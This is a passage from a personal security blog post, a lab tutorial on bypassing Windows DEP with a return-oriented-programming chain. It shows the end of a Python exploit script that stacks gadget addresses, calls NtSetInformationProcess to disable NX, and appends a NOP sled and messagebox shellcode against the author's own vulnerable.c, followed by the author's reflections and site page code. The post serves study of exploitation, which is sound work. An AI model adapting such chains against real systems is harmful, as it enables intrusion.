= <span class="hljs-string">b&#x27;F&#x27;</span> * <span class="hljs-number">4</span><br><br>    <span class="hljs-comment"># adjust ESP</span><br>    esp_adjust2 = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7eb3e8b9</span>)<br>    esp_adjust2_padding = <span class="hljs-string">b&#x27;G&#x27;</span> * (<span class="hljs-number">4</span> * <span class="hljs-number">3</span>)<br><br>    nx_routine = struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x7eb4e5fc</span>)<br><br>    nops = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">8</span><br><br>    shellcode = read_shellcode()<br><br>    exploit = <span class="hljs-string">b&#x27;&#x27;</span><br>    exploit += junk                 <span class="hljs-comment"># AAAAAAAA....</span><br>    exploit += eax_adjust           <span class="hljs-comment"># mov eax # pop ebx # retn</span><br>    exploit += eax_adjust_padding   <span class="hljs-comment"># padding for &#x27;pop ebx&#x27;</span><br>    exploit += set_al               <span class="hljs-comment"># mov al, 1 # pop edi # pop esi # pop ebp # retn 0x10</span><br>    exploit += set_al_padding       <span class="hljs-comment"># padding for the &#x27;pop&#x27; of four times</span><br>    exploit += ebp_adjust           <span class="hljs-comment"># push ebp # xor dl, byte ptr ds:[eax] # pop esp # retn 0x04</span><br>    exploit += ebp_adjust_padding   <span class="hljs-comment"># padding for &#x27;retn 0x10&#x27;</span><br>    exploit += esp_adjust           <span class="hljs-comment"># pop esi # pop edi # pop ebx # retn</span><br>    exploit += pop1                 <span class="hljs-comment">#</span><br>    exploit += pop2                 <span class="hljs-comment">#</span><br>    exploit += pop3                 <span class="hljs-comment">#</span><br>    exploit += pop4                 <span class="hljs-comment">#</span><br>    exploit += esp_adjust2          <span class="hljs-comment"># jmp short 0x1a</span><br>    exploit += esp_adjust2_padding  <span class="hljs-comment">#</span><br>    exploit += nx_routine           <span class="hljs-comment"># ... --&gt; NtSetInformationProcess</span><br>    exploit += nops                 <span class="hljs-comment"># sled</span><br>    exploit += shellcode            <span class="hljs-comment"># messagebox payload</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit_dep.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(exploit)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>Now, let’s try to exploit <code>vulnerable.c</code>!</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-25-DEP/10.png'><img src="/images/article/2026-9-25-DEP/10.png" width=800/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This is actually my first time developing a ROP exploit from scratch. Honestly, it was much harder than I expected. I think this is what happens whenever we try something new fro the first time. Unlike the techniques I introduced in the previous articles, ROP requires a much deeper understanding of assembly code and how the CPU handles the stack, registers, and control flow. That was probably the most difficult part for me.</p>
+<p>However, after finally getting the whole ROP chain to work, I realized that the process was not as scary as it first seemed. I still have a lot to learn about ROP, but at least I have now completed my first one!</p>
+<p>Among the six methods I mentioned earlier, ROP is probably also the simplest one to start with. If even this one already feels this difficult, I can imagine how much more complicated the later techniques will be…</p>
+<p>Recently, I have also been dealing with some frustrating things in my personal life. It has been a difficult period for me, but I hope things will gradually get better from here.</p>
+<p align="center" class='item-img' data-src='/images/meme/Rio/8.png'><img src="/images/meme/Rio/8.png" width=250/>
+</p>
+
+<p>Anyway, I guess there is still a long way to go. Let’s keep going.</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p>I drew a <a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/149953063">new drawing</a>!</p>
+<p align="center" class='item-img' data-src='/images/meme/Wallpaper/MyArt/12.png'><img src="/images/meme/Wallpaper/MyArt/12.png" width=700/>
+    <figcaption>
+    もしかして、同じ方向ですか…？
+    </figcaption>
+</p><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/09/20/2026-9-20-IntallToolsOnWindowsXP/">[Troubleshooting] How to Install WinDbg and Visual Studio 2008 on Windows XP Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DEP"><span class="toc-number">2.</span> <span class="toc-text">DEP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROP"><span class="toc-number">3.</span> <span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZwSetInformationProcess"><span class="toc-number">4.</span> <span class="toc-text">ZwSetInformationProcess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">5.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">7.</span> <span class="toc-text">THANKS FOR READING!</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
